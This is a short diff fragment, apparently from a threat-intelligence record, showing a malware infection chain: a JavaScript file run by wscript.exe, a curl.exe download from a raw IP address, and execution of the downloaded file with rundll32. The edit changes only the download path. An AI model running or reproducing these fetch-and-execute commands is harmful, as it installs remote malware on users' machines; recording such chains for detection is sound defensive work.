@@ -13,7 +13,7 @@ Exec >
 
 wscript.exe C:\Users\Admin\AppData\Local\Temp\docu_DF631_Jun_14_1.js
 
-curl.exe -o amounted.tmp.tmp http://192.121.17.149/QmVep/DB278
+curl.exe -o c:\users\public\amounted.tmp.tmp http://192.121.17.149/QmVep/DB278
 
 conhost.exe rundll32.exe amounted.tmp,must
 
